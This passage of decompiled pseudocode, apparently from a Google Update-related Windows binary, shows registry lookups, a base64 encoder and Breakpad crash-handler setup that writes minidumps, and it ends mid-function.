  int *local_8;
  
  if (param_1 != '\0') {
    local_8 = (int *)0x0;
    ppHVar1 = (HMODULE *)FUN_004141ff(&local_10,param_2);
    uVar2 = FUN_00406d00(*ppHVar1,L"usagestats",4,&local_8,(DWORD *)0x0);
    FUN_00401df0((int **)(local_10 + -0x10));
    local_c = local_8;
    if (-1 < (int)uVar2) goto LAB_00414288;
  }
  local_c = (int *)0x0;
  ppHVar1 = (HMODULE *)FUN_004141b8(&local_10,param_1,param_2);
  uVar2 = FUN_00406d00(*ppHVar1,L"usagestats",4,&local_c,(DWORD *)0x0);
  uVar3 = FUN_00401df0((int **)(local_10 + -0x10));
  if ((int)uVar2 < 0) {
    return uVar3 & 0xffffff00;
  }
LAB_00414288:
  return (uint)(local_c == (int *)0x1);
}



uint FUN_004142d7(void)

{
  uint uVar1;
  undefined8 uVar2;
  int *local_8;
  
  local_8 = (int *)0x0;
  uVar1 = FUN_00406d00((HMODULE)L"HKLM\\Software\\Google\\Update\\",L"OemInstallTime",4,&local_8,
                       (DWORD *)0x0);
  if ((int)uVar1 < 0) {
    uVar1 = uVar1 & 0xffffff00;
  }
  else {
    uVar2 = FUN_00407c01();
    uVar2 = __aulldiv((uint)uVar2,(uint)((ulonglong)uVar2 >> 0x20),10000000,0);
    uVar1 = FUN_004274a4(((int)uVar2 + 0x49ef6f00) - (int)local_8);
    uVar1 = uVar1 & 0xffffff00 | (uint)((int)uVar1 < 0x3f480);
  }
  return uVar1;
}



void * __fastcall FUN_00414330(void *param_1,char param_2)

{
  LANGID LVar1;
  LANGID LVar2;
  LANGID LVar3;
  int iVar4;
  int iVar5;
  HMODULE pHVar6;
  
  if (param_2 == '\0') {
    LVar1 = GetUserDefaultLangID();
  }
  else {
    LVar1 = GetSystemDefaultLangID();
  }
  iVar4 = 0;
  LVar3 = 0x409;
  iVar5 = 0;
  LVar2 = 0x409;
  do {
    if (LVar1 == LVar2) goto LAB_00414372;
    iVar5 = iVar5 + 1;
    LVar2 = *(LANGID *)(&UNK_0042de40 + iVar5 * 0x1a);
  } while (LVar2 != 0);
  LVar1 = 0x409;
LAB_00414372:
  do {
    if (LVar3 == LVar1) {
      pHVar6 = (HMODULE)(&DAT_0042de42 + iVar4 * 0x1a);
      goto LAB_00414397;
    }
    iVar4 = iVar4 + 1;
    LVar3 = *(LANGID *)(&UNK_0042de40 + iVar4 * 0x1a);
  } while (LVar3 != 0);
  pHVar6 = (HMODULE)&DAT_00431cc8;
LAB_00414397:
  FUN_00404cfa(param_1,pHVar6);
  return param_1;
}



int __fastcall FUN_004143cc(uint param_1,uint param_2)

{
  code *pcVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  undefined8 uVar5;
  
  uVar4 = ((int)param_1 >> 0x1f) << 2 | param_1 >> 0x1e;
  if ((-1 < (int)uVar4) && ((0 < (int)uVar4 || (0x7fffffff < param_1 << 2)))) {
    ATL::AtlThrowImpl(-0x7fffbffb);
    pcVar1 = (code *)swi(3);
    iVar3 = (*pcVar1)();
    return iVar3;
  }
  uVar5 = __alldiv(param_1 << 2,uVar4,3,0);
  iVar3 = (int)uVar5;
  if ((param_2 & 1) == 0) {
    iVar3 = iVar3 + (int)param_1 % 3;
  }
  iVar2 = iVar3 / 0x4c;
  if (iVar3 % 0x4c != 0) {
    uVar4 = iVar3 % 0x4c & 0x80000003;
    if ((int)uVar4 < 0) {
      uVar4 = (uVar4 - 1 | 0xfffffffc) + 1;
    }
    if (uVar4 != 0) {
      iVar3 = iVar3 + (4 - uVar4);
    }
  }
  if ((param_2 & 2) == 0) {
    iVar3 = iVar3 + iVar2 * 2 + 2;
  }
  return iVar3;
}



undefined4 __fastcall
FUN_00414445(byte *param_1,uint param_2,uint *param_3,int *param_4,uint param_5)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  undefined4 uVar6;
  uint uVar7;
  int iVar8;
  uint uVar9;
  int local_24;
  int local_1c;
  int local_18;
  int local_10;
  byte *local_c;
  int local_8;
  
  if ((((param_1 == (byte *)0x0) || (param_3 == (uint *)0x0)) || (param_4 == (int *)0x0)) ||
     (iVar2 = FUN_004143cc(param_2,param_5), *param_4 < iVar2)) {
    uVar6 = 0;
  }
  else {
    uVar7 = 0;
    iVar2 = 0;
    iVar8 = (int)param_2 % 3;
    iVar3 = (int)param_2 / 3 << 2;
    iVar4 = iVar3 / 0x4c;
    iVar3 = iVar3 % 0x4c;
    local_10 = 0;
    local_8 = 0;
    iVar5 = 0x13;
    local_1c = 0x13;
    local_c = param_1;
    if (-1 < iVar4) {
      do {
        if (local_8 == iVar4) {
          iVar5 = (int)(iVar3 + (iVar3 >> 0x1f & 3U)) >> 2;
          local_1c = iVar5;
        }
        local_18 = iVar5;
        if (0 < iVar5) {
          do {
            iVar2 = 3;
            uVar9 = 0;
            do {
              bVar1 = *local_c;
              local_c = local_c + 1;
              uVar9 = (uVar9 | bVar1) << 8;
              iVar2 = iVar2 + -1;
            } while (iVar2 != 0);
            iVar2 = 4;
            do {
              *(char *)param_3 =
                   "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/warning: removing Breakpad handler out of order\n"
                   [uVar9 >> 0x1a];
              param_3 = (uint *)((int)param_3 + 1);
              iVar2 = iVar2 + -1;
              uVar9 = uVar9 << 6;
            } while (iVar2 != 0);
            local_18 = local_18 + -1;
            iVar5 = local_1c;
          } while (local_18 != 0);
        }
        iVar2 = local_10 + iVar5 * 4;
        if ((param_5 & 2) == 0) {
          *(undefined2 *)param_3 = 0xa0d;
          param_3 = (uint *)((int)param_3 + 2);
          iVar2 = iVar2 + 2;
        }
        local_8 = local_8 + 1;
        local_10 = iVar2;
      } while (local_8 <= iVar4);
      if ((iVar2 != 0) && ((param_5 & 2) == 0)) {
        param_3 = (uint *)((int)param_3 + -2);
        iVar2 = iVar2 + -2;
      }
    }
    if (iVar8 == 0) {
      local_24 = 0;
    }
    else {
      local_24 = iVar8 + 1;
    }
    if (local_24 != 0) {
      iVar5 = 0;
      do {
        if (iVar5 < iVar8) {
          uVar7 = uVar7 | *local_c;
          local_c = local_c + 1;
        }
        uVar7 = uVar7 << 8;
        iVar5 = iVar5 + 1;
      } while (iVar5 < 3);
      iVar5 = local_24;
      if (0 < local_24) {
        do {
          *(char *)param_3 =
               "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/warning: removing Breakpad handler out of order\n"
               [uVar7 >> 0x1a];
          param_3 = (uint *)((int)param_3 + 1);
          iVar5 = iVar5 + -1;
          uVar7 = uVar7 << 6;
        } while (iVar5 != 0);
      }
      iVar2 = iVar2 + local_24;
      if ((param_5 & 1) == 0) {
        uVar7 = 4 - local_24;
        if (0 < (int)uVar7) {
          FUN_00416e80(param_3,0x3d,uVar7);
        }
        iVar2 = iVar2 + uVar7;
      }
    }
    *param_4 = iVar2;
    uVar6 = 1;
  }
  return uVar6;
}



undefined4 __fastcall FUN_004145e0(byte **param_1,uint **param_2)

{
  undefined4 uVar1;
  byte **ppbVar2;
  int iVar3;
  uint uVar4;
  undefined2 extraout_DX;
  undefined2 extraout_DX_00;
  byte **local_8;
  
  if (*param_1 == param_1[1]) {
    param_2[1] = *param_2;
    uVar1 = 0;
  }
  else {
    uVar4 = (int)param_1[1] - (int)*param_1;
    if (uVar4 < 0x80000000) {
      local_8 = param_1;
      ppbVar2 = (byte **)FUN_004143cc(uVar4,2);
      FUN_00402a8e(param_2,extraout_DX,(uint)ppbVar2);
      local_8 = ppbVar2;
      iVar3 = FUN_00414445(*param_1,(int)param_1[1] - (int)*param_1,*param_2,(int *)&local_8,2);
      if (iVar3 == 0) {
        uVar1 = 0x80004005;
      }
      else {
        if ((int)local_8 < (int)ppbVar2) {
          FUN_00402a8e(param_2,extraout_DX_00,(uint)local_8);
        }
        uVar1 = 0;
      }
    }
    else {
      uVar1 = 0x80070057;
    }
  }
  return uVar1;
}



int __fastcall FUN_0041465b(byte **param_1,void *param_2)

{
  int iVar1;
  uint *local_10;
  int local_c;
  undefined4 local_8;
  
  if (*param_1 == param_1[1]) {
    iVar1 = 0;
  }
  else {
    local_10 = (uint *)0x0;
    local_c = 0;
    local_8 = 0;
    iVar1 = FUN_004145e0(param_1,&local_10);
    if (-1 < iVar1) {
      if ((uint)(local_c - (int)local_10) < 0x80000000) {
        FUN_004027cd(param_2,(int)local_10,local_c - (int)local_10);
        iVar1 = 0;
      }
      else {
        iVar1 = -0x7fffbffb;
      }
    }
    FUN_00402ccf(&local_10);
  }
  return iVar1;
}



void * __thiscall
FUN_004146bd(void *this,void **param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4,
            undefined4 param_5,DWORD param_6,undefined4 *param_7,undefined4 *param_8)

{
  undefined4 uVar1;
  undefined4 extraout_ECX;
  
  *(undefined4 *)((int)this + 0xc) = 0;
  *(undefined4 *)((int)this + 0x24) = 7;
  *(undefined4 *)((int)this + 0x20) = 0;
  *(undefined2 *)((int)this + 0x10) = 0;
  *(undefined4 *)((int)this + 0x3c) = 7;
  *(undefined4 *)((int)this + 0x38) = 0;
  *(undefined2 *)((int)this + 0x28) = 0;
  *(undefined4 *)((int)this + 0x54) = 7;
  *(undefined4 *)((int)this + 0x50) = 0;
  *(undefined2 *)((int)this + 0x40) = 0;
  *(undefined4 *)((int)this + 0xc0) = 0;
  *(undefined4 *)((int)this + 0xc4) = 0;
  uVar1 = FUN_004154e1((int *)0x0,(int *)0x0);
  *(undefined4 *)((int)this + 0xc0) = uVar1;
  FUN_00414728(this,param_1,extraout_ECX,extraout_ECX,param_4,extraout_ECX,param_6,param_7,
               extraout_ECX,extraout_ECX,param_8);
  return this;
}



void __thiscall
FUN_00414728(void *this,void **param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4,
            undefined4 param_5,DWORD param_6,undefined4 *param_7,undefined4 param_8,
            undefined4 param_9,undefined4 *param_10)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  HANDLE pvVar4;
  HMODULE pHVar5;
  FARPROC pFVar6;
  LPTOP_LEVEL_EXCEPTION_FILTER pPVar7;
  PVOID pvVar8;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint uVar9;
  undefined4 *puVar10;
  void **ppvVar11;
  undefined6 uVar12;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  int local_c;
  undefined4 *local_8;
  
  LOCK();
  local_c = DAT_00437e00 + 1;
  DAT_00437e00 = DAT_00437e00 + 1;
  *(undefined4 **)((int)this + 8) = param_4;
  *(undefined4 *)this = 0;
  *(code **)((int)this + 4) = FUN_00412353;
  *(undefined4 *)((int)this + 0x58) = 0;
  *(undefined4 *)((int)this + 0x5c) = 0;
  *(undefined4 *)((int)this + 0x60) = 0;
  *(undefined4 *)((int)this + 100) = 0;
  *(undefined4 *)((int)this + 0x68) = 0;
  *(DWORD *)((int)this + 0x6c) = param_6;
  *(undefined4 *)((int)this + 0x70) = 0;
  *(undefined4 *)((int)this + 0x74) = 0;
  *(undefined4 *)((int)this + 0x78) = 7;
  *(undefined4 *)((int)this + 0x7c) = 0;
  *(undefined4 *)((int)this + 0x80) = 0;
  *(undefined4 *)((int)this + 0x84) = 0;
  *(undefined4 *)((int)this + 0x88) = 0;
  *(undefined *)((int)this + 0x8c) = 0;
  *(undefined4 *)((int)this + 0xa8) = 0;
  *(undefined4 *)((int)this + 0xac) = 0;
  *(undefined4 *)((int)this + 0xb0) = 0;
  *(undefined4 *)((int)this + 0xb4) = 0;
  *(undefined4 *)((int)this + 0xb8) = 0;
  *(undefined2 *)((int)this + 0xbc) = 0;
  *(undefined *)((int)this + 0xbe) = 0;
  puVar10 = (undefined4 *)0x0;
  local_8 = (undefined4 *)this;
  if (param_7 != (undefined4 *)0x0) {
    uVar12 = FUN_00416f82(0x348);
    if ((undefined2 *)uVar12 == (undefined2 *)0x0) {
      puVar2 = (undefined4 *)0x0;
    }
    else {
      puVar2 = (undefined4 *)
               FUN_0041555d((undefined2 *)uVar12,(short)((uint6)uVar12 >> 0x20),param_7,
                            *(undefined4 *)((int)this + 0x6c),param_10);
    }
    if (puVar2 != (undefined4 *)0x0) {
      if (puVar2[10] == 0) {
        param_7 = (undefined4 *)FUN_004155b9(puVar2);
        puVar10 = puVar2;
        if (param_7 == (undefined4 *)0x0) goto LAB_0041483c;
        uVar3 = FUN_00415658(puVar2,param_7);
        CloseHandle(param_7);
        this = local_8;
        if ((char)uVar3 == '\0') goto LAB_0041483c;
      }
      puVar10 = (undefined4 *)0x0;
      puVar1 = *(undefined4 **)((int)this + 0xc);
      if (puVar2 != puVar1) {
        if (puVar1 != (undefined4 *)0x0) {
          FUN_0041549d(puVar1);
        }
        *(undefined4 **)((int)this + 0xc) = puVar2;
      }
    }
  }
LAB_0041483c:
  if (*(int *)((int)this + 0xc) == 0) {
    InitializeCriticalSection((LPCRITICAL_SECTION)((int)this + 0x90));
    pvVar4 = CreateSemaphoreW((LPSECURITY_ATTRIBUTES)0x0,0,1,(LPCWSTR)0x0);
    *(HANDLE *)((int)this + 0xa8) = pvVar4;
    pvVar4 = CreateSemaphoreW((LPSECURITY_ATTRIBUTES)0x0,0,1,(LPCWSTR)0x0);
    *(HANDLE *)((int)this + 0xac) = pvVar4;
    if ((pvVar4 != (HANDLE)0x0) && (*(int *)((int)this + 0xa8) != 0)) {
      pvVar4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0x10000,FUN_00414b8b,this,0,&param_6);
      *(HANDLE *)((int)this + 0x88) = pvVar4;
    }
    pHVar5 = LoadLibraryW(L"dbghelp.dll");
    *(HMODULE *)((int)this + 100) = pHVar5;
    if (pHVar5 != (HMODULE)0x0) {
      pFVar6 = GetProcAddress(pHVar5,"MiniDumpWriteDump");
      *(FARPROC *)((int)this + 0x68) = pFVar6;
    }
    pHVar5 = LoadLibraryW(L"rpcrt4.dll");
    *(HMODULE *)((int)this + 0x70) = pHVar5;
    uVar9 = extraout_EDX;
    if (pHVar5 != (HMODULE)0x0) {
      pFVar6 = GetProcAddress(pHVar5,"UuidCreate");
      *(FARPROC *)((int)this + 0x74) = pFVar6;
      uVar9 = extraout_EDX_00;
    }
    ppvVar11 = (void **)((int)this + 0x10);
    if (ppvVar11 != param_1) {
      FUN_0040ad85(ppvVar11,uVar9,param_1,(void *)0x0,(void *)0xffffffff);
    }
    if (7 < *(uint *)((int)this + 0x24)) {
      ppvVar11 = (void **)*ppvVar11;
    }
    *(void ***)((int)this + 0x58) = ppvVar11;
    FUN_0041530a((int)this);
  }
  local_1c = 0;
  local_18 = 0;
  local_14 = 0;
  FUN_004153e4((undefined4 *)((int)this + 0xc0),&local_1c);
  if (local_c == 1) {
    InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_00437de8);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00437de8);
  if (DAT_00437e04 == (undefined4 *)0x0) {
    puVar2 = (undefined4 *)FUN_00416f82(0xc);
    if (puVar2 == (undefined4 *)0x0) {
      DAT_00437e04 = (undefined4 *)0x0;
    }
    else {
      DAT_00437e04 = puVar2;
      *puVar2 = 0;
      puVar2[1] = 0;
      puVar2[2] = 0;
    }
  }
  param_4 = (undefined4 *)this;
  FUN_0041543f(&param_4);
  pPVar7 = SetUnhandledExceptionFilter(FUN_00414c8b);
  *(LPTOP_LEVEL_EXCEPTION_FILTER *)((int)this + 0x7c) = pPVar7;
  pvVar8 = FUN_00419ac8(FUN_00414d27);
  *(PVOID *)((int)this + 0x80) = pvVar8;
  pvVar8 = FUN_00416f37(FUN_00414ea3);
  *(PVOID *)((int)this + 0x84) = pvVar8;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00437de8);
  if (puVar10 != (undefined4 *)0x0) {
    FUN_0041549d(puVar10);
  }
  return;
}



void __fastcall FUN_004149c2(int param_1)

{
  int iVar1;
  int **_Memory;
  int *piVar2;
  char *pcVar3;
  int *local_8;
  
  if (*(int *)(param_1 + 100) != 0) {
    FreeLibrary(*(HMODULE *)(param_1 + 100));
  }
  if (*(int *)(param_1 + 0x70) != 0) {
    FreeLibrary(*(HMODULE *)(param_1 + 0x70));
  }
  if (*(int *)(param_1 + 0x78) != 0) {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00437de8);
    if ((*(byte *)(param_1 + 0x78) & 1) != 0) {
      SetUnhandledExceptionFilter(*(LPTOP_LEVEL_EXCEPTION_FILTER *)(param_1 + 0x7c));
    }
    if ((*(byte *)(param_1 + 0x78) & 2) != 0) {
      FUN_00419ac8(*(PVOID *)(param_1 + 0x80));
    }
    if ((*(byte *)(param_1 + 0x78) & 4) != 0) {
      FUN_00416f37(*(PVOID *)(param_1 + 0x84));
    }
    _Memory = DAT_00437e04;
    if (DAT_00437e04[1][-1] == param_1) {
      DAT_00437e04[1] = DAT_00437e04[1] + -1;
    }
    else {
      pcVar3 = "warning: removing Breakpad handler out of order\n";
      iVar1 = FUN_0041bff1();
      FUN_00427c0d((FILE *)(iVar1 + 0x40),(int)pcVar3);
      piVar2 = *DAT_00437e04;
      _Memory = DAT_00437e04;
      if (piVar2 != DAT_00437e04[1]) {
        local_8 = piVar2 + 1;
        do {
          if (*piVar2 == param_1) {
            FID_conflict__memcpy(piVar2,local_8,(int)_Memory[1] - (int)local_8 & 0xfffffffc);
            _Memory[1] = _Memory[1] + -1;
            _Memory = DAT_00437e04;
          }
          else {
            piVar2 = piVar2 + 1;
            local_8 = local_8 + 1;
          }
        } while (piVar2 != _Memory[1]);
      }
    }
    piVar2 = *_Memory;
    if (piVar2 == _Memory[1]) {
      if (piVar2 != (int *)0x0) {
        FID_conflict__free(piVar2);
        *_Memory = (int *)0x0;
        _Memory[1] = (int *)0x0;
        _Memory[2] = (int *)0x0;
      }
      FID_conflict__free(_Memory);
      DAT_00437e04 = (int **)0x0;
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00437de8);
  }
  if (*(int *)(param_1 + 0xc) == 0) {
    *(undefined *)(param_1 + 0x8c) = 1;
    ReleaseSemaphore(*(HANDLE *)(param_1 + 0xa8),1,(LPLONG)0x0);
    WaitForSingleObject(*(HANDLE *)(param_1 + 0x88),60000);
    CloseHandle(*(HANDLE *)(param_1 + 0x88));
    *(undefined4 *)(param_1 + 0x88) = 0;
    DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x90));
    CloseHandle(*(HANDLE *)(param_1 + 0xa8));
    CloseHandle(*(HANDLE *)(param_1 + 0xac));
  }
  LOCK();
  DAT_00437e00 = DAT_00437e00 + -1;
  if (DAT_00437e00 == 0) {
    DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_00437de8);
  }
  FUN_0041029f((int **)(param_1 + 0xc0));
  FUN_0040ae40((void *)(param_1 + 0x40),'\x01',(void *)0x0);
  FUN_0040ae40((void *)(param_1 + 0x28),'\x01',(void *)0x0);
  FUN_0040ae40((void *)(param_1 + 0x10),'\x01',(void *)0x0);
  if (*(void **)(param_1 + 0xc) != (void *)0x0) {
    FUN_0041549d(*(void **)(param_1 + 0xc));
  }
  return;
}



undefined4 FUN_00414b8b(void *param_1)

{
  undefined uVar1;
  DWORD DVar2;
  
  while( true ) {
    do {
      DVar2 = WaitForSingleObject(*(HANDLE *)((int)param_1 + 0xa8),0xffffffff);
    } while (DVar2 != 0);
    if (*(char *)((int)param_1 + 0x8c) != '\0') break;
    uVar1 = FUN_00415036(param_1,*(uint *)((int)param_1 + 0xb0),*(int *)((int)param_1 + 0xb4),
                         *(void **)((int)param_1 + 0xb8));
    *(undefined *)((int)param_1 + 0xbc) = uVar1;
    ReleaseSemaphore(*(HANDLE *)((int)param_1 + 0xac),1,(LPLONG)0x0);
  }
  return 0;
}



int * __fastcall FUN_00414be4(int *param_1)

{
  int iVar1;
  code *pcVar2;
  int *piVar3;
  uint uVar4;
  char *unaff_EDI;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00437de8);
  DAT_00437e08 = DAT_00437e08 + 1;
  uVar4 = (DAT_00437e04[1] - *DAT_00437e04 >> 2) - DAT_00437e08;
  if (uVar4 < (uint)(DAT_00437e04[1] - *DAT_00437e04 >> 2)) {
    iVar1 = *(int *)(*DAT_00437e04 + uVar4 * 4);
    *param_1 = iVar1;
    SetUnhandledExceptionFilter(*(LPTOP_LEVEL_EXCEPTION_FILTER *)(iVar1 + 0x7c));
    FUN_00419ac8(*(PVOID *)(*param_1 + 0x80));
    FUN_00416f37(*(PVOID *)(*param_1 + 0x84));
    return param_1;
  }
  FUN_00422ed7((undefined4 *)"invalid vector<T> subscript",unaff_EDI);
  pcVar2 = (code *)swi(3);
  piVar3 = (int *)(*pcVar2)();
  return piVar3;
}



void FUN_00414c56(void)

{
  SetUnhandledExceptionFilter(FUN_00414c8b);
  FUN_00419ac8(FUN_00414d27);
  FUN_00416f37(FUN_00414ea3);
  DAT_00437e08 = DAT_00437e08 + -1;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00437de8);
  return;
}



undefined4 FUN_00414c8b(int **param_1)

{
  int *piVar1;
  bool bVar2;
  char cVar3;
  DWORD DVar4;
  uint uVar5;
  undefined4 uVar6;
  int **ppiVar7;
  void *pvVar8;
  void *local_c [2];
  
  FUN_00414be4((int *)local_c);
  uVar6 = 1;
  piVar1 = *param_1;
  if ((*piVar1 == -0x7ffffffd) || (*piVar1 == -0x7ffffffc)) {
    bVar2 = true;
  }
  else {
    bVar2 = false;
  }
  if ((*piVar1 == -0x3ffffff8) && (*(char *)((int)local_c[0] + 0xbe) != '\0')) {
    uVar6 = 0xffffffff;
  }
  else {
    if ((!bVar2) || (*(char *)((int)local_c[0] + 0xbd) != '\0')) {
      pvVar8 = (void *)0x0;
      if (*(int *)((int)local_c[0] + 0xc) == 0) {
        uVar5 = FUN_00414fb4(local_c[0],param_1,0);
        cVar3 = (char)uVar5;
      }
      else {
        ppiVar7 = param_1;
        DVar4 = GetCurrentThreadId();
        cVar3 = FUN_00415036(local_c[0],DVar4,(int)ppiVar7,pvVar8);
      }
      if (cVar3 != '\0') goto LAB_00414d17;
    }
    if (*(code **)((int)local_c[0] + 0x7c) == (code *)0x0) {
      uVar6 = 0;
    }
    else {
      uVar6 = (**(code **)((int)local_c[0] + 0x7c))(param_1);
    }
  }
LAB_00414d17:
  FUN_00414c56();
  return uVar6;
}



void FUN_00414d27(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  code *pcVar1;
  void *this;
  char cVar2;
  DWORD DVar3;
  uint uVar4;
  int extraout_ECX;
  int extraout_ECX_00;
  int extraout_ECX_01;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined4 *puVar5;
  undefined *puVar6;
  undefined4 uStack1612;
  undefined4 local_648;
  uint *local_644;
  uint *local_640;
  void *local_63c;
  uint local_638 [3];
  undefined4 uStack1580;
  undefined *puStack1576;
  undefined *puStack1572;
  undefined4 uStack1568;
  undefined auStack1516 [4];
  uint local_5e8 [64];
  undefined local_4e8 [252];
  undefined auStack1004 [4];
  undefined local_3e8 [252];
  undefined4 uStack748;
  undefined4 local_2e8;
  undefined4 local_2e4;
  uint local_2e0 [181];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&uStack1612;
  local_648 = param_3;
  FUN_00414be4((int *)&local_63c);
  this = local_63c;
  FUN_00416e80(local_5e8,0,0x308);
  FUN_00427469(extraout_ECX,extraout_DL,local_5e8,0x80,0xffffffff,&DAT_00431e64,(char)param_1);
  FUN_00427469(extraout_ECX_00,extraout_DL_00,local_4e8,0x80,0xffffffff,&DAT_00431e64,(char)param_2)
  ;
  FUN_00427469(extraout_ECX_01,extraout_DL_01,local_3e8,0x80,0xffffffff,&DAT_00431e64,
               (char)local_648);
  local_2e8 = param_4;
  local_2e4 = 1;
  FUN_00416e80(local_638,0,0x50);
  FUN_00416e80(local_2e0,0,0x2cc);
  local_644 = local_638;
  local_640 = local_2e0;
  RtlCaptureContext(local_640);
  puStack1576 = auStack1516;
  local_63c = (void *)0xc000000d;
  puStack1572 = auStack1004;
  uStack1568 = uStack748;
  puVar6 = auStack1516;
  uStack1580 = 3;
  puVar5 = &local_648;
  if (*(int *)((int)this + 0xc) == 0) {
    uVar4 = FUN_00414fb4(this,puVar5,puVar6);
    cVar2 = (char)uVar4;
  }
  else {
    DVar3 = GetCurrentThreadId();
    cVar2 = FUN_00415036(this,DVar3,(int)puVar5,puVar6);
  }
  if (cVar2 == '\0') {
    if (*(code **)((int)this + 0x80) == (code *)0x0) {
      FUN_00419a8d();
    }
    else {
      (**(code **)((int)this + 0x80))(param_1,param_2,uStack1612,param_4,param_5);
    }
  }
  _exit(0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined8 FUN_00414ea3(void)

{
  code *pcVar1;
  char cVar2;
  DWORD DVar3;
  uint uVar4;
  undefined8 uVar5;
  void **ppvVar6;
  undefined *puVar7;
  undefined auStack1608 [4];
  void *local_644;
  uint *local_640;
  uint *local_63c;
  uint local_638 [3];
  undefined4 uStack1580;
  undefined *puStack1576;
  undefined *puStack1572;
  undefined4 uStack1568;
  undefined auStack1516 [4];
  uint local_5e8 [127];
  undefined auStack1004 [256];
  undefined4 uStack748;
  undefined4 local_2e4;
  uint local_2e0 [181];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)auStack1608;
  FUN_00414be4((int *)&local_644);
  FUN_00416e80(local_5e8,0,0x308);
  local_2e4 = 2;
  FUN_00416e80(local_638,0,0x50);
  FUN_00416e80(local_2e0,0,0x2cc);
  local_640 = local_638;
  local_63c = local_2e0;
  RtlCaptureContext(local_63c);
  puStack1576 = auStack1516;
  local_63c = (uint *)0xc0000025;
  puStack1572 = auStack1004;
  uStack1568 = uStack748;
  puVar7 = auStack1516;
  uStack1580 = 3;
  ppvVar6 = &local_644;
  if (*(int *)((int)local_644 + 0xc) == 0) {
    uVar4 = FUN_00414fb4(local_644,ppvVar6,puVar7);
    cVar2 = (char)uVar4;
  }
  else {
    DVar3 = GetCurrentThreadId();
    cVar2 = FUN_00415036(local_644,DVar3,(int)ppvVar6,puVar7);
  }
  if (cVar2 == '\0') {
    if (*(code **)((int)local_644 + 0x84) == (code *)0x0) {
      FUN_00414c56();
      uVar5 = FUN_0041a954();
      return uVar5;
    }
    (**(code **)((int)local_644 + 0x84))();
  }
  _exit(0);
  pcVar1 = (code *)swi(3);
  uVar5 = (*pcVar1)();
  return uVar5;
}



uint __thiscall FUN_00414fb4(void *this,undefined4 param_1,undefined4 param_2)

{
  DWORD DVar1;
  uint extraout_EAX;
  uint uVar2;
  
  EnterCriticalSection((LPCRITICAL_SECTION)((int)this + 0x90));
  uVar2 = 0;
  if (*(int *)((int)this + 0x88) != 0) {
    DVar1 = GetCurrentThreadId();
    *(DWORD *)((int)this + 0xb0) = DVar1;
    *(undefined4 *)((int)this + 0xb4) = param_1;
    *(undefined4 *)((int)this + 0xb8) = param_2;
    ReleaseSemaphore(*(HANDLE *)((int)this + 0xa8),1,(LPLONG)0x0);
    WaitForSingleObject(*(HANDLE *)((int)this + 0xac),0xffffffff);
    *(undefined4 *)((int)this + 0xb0) = 0;
    *(undefined4 *)((int)this + 0xb4) = 0;
    *(undefined4 *)((int)this + 0xb8) = 0;
    uVar2 = (uint)*(byte *)((int)this + 0xbc);
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)this + 0x90));
  return extraout_EAX & 0xffffff00 | uVar2;
}



void __thiscall FUN_00415036(void *this,uint param_1,int param_2,void *param_3)

{
  char cVar1;
  byte bVar2;
  HANDLE pvVar4;
  undefined8 uVar5;
  uint uVar3;
  
                    // WARNING: Load size is inaccurate
  if ((*this != (code *)0x0) &&
     (cVar1 = (**this)(*(undefined4 *)((int)this + 8),param_2,param_3), cVar1 == '\0')) {
    return;
  }
  if (*(void **)((int)this + 0xc) == (void *)0x0) {
    pvVar4 = GetCurrentProcess();
    uVar5 = FUN_00415102(this,param_1,param_2,(int)param_3,pvVar4);
    bVar2 = (byte)uVar5;
  }
  else {
    uVar3 = FUN_00415726(*(void **)((int)this + 0xc),param_2,param_3);
    bVar2 = (byte)uVar3;
  }
  param_1 = param_1 & 0xffffff00 | (uint)bVar2;
  if (*(code **)((int)this + 4) != (code *)0x0) {
    (**(code **)((int)this + 4))
              (*(undefined4 *)((int)this + 0x58),*(undefined4 *)((int)this + 0x5c),
               *(undefined4 *)((int)this + 8),param_2,param_3,param_1);
  }
  return;
}



undefined4 FUN_004150a6(int **param_1,int param_2,undefined4 *param_3)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = *(int *)(param_2 + 8);
  if ((((iVar1 != 0) && (iVar1 != 1)) && (iVar1 != 3)) && (iVar1 != 4)) {
    if (iVar1 == 5) {
      piVar2 = *param_1;
      if (piVar2 == param_1[1]) {
        return 0;
      }
      *param_3 = piVar2[2];
      param_3[1] = piVar2[3];
      param_3[2] = (*param_1)[4];
      *param_1 = (int *)**param_1;
    }
    else {
      if (iVar1 != 6) {
        return 0;
      }
      *param_3 = 0;
      param_3[1] = 0;
    }
  }
  return 1;
}



undefined8 __thiscall
FUN_00415102(void *this,undefined4 param_1,int param_2,int param_3,HANDLE param_4)

{
  int iVar1;
  HANDLE hObject;
  int iVar2;
  HANDLE pvVar3;
  SIZE_T SVar4;
  PVOID *ppvVar5;
  DWORD DVar6;
  int iVar7;
  uint uVar8;
  undefined8 uVar9;
  HANDLE pvVar10;
  undefined4 uVar11;
  int *piVar12;
  code **ppcVar13;
  _MEMORY_BASIC_INFORMATION local_9c;
  int local_80 [6];
  undefined4 local_68;
  int local_64;
  undefined4 local_60;
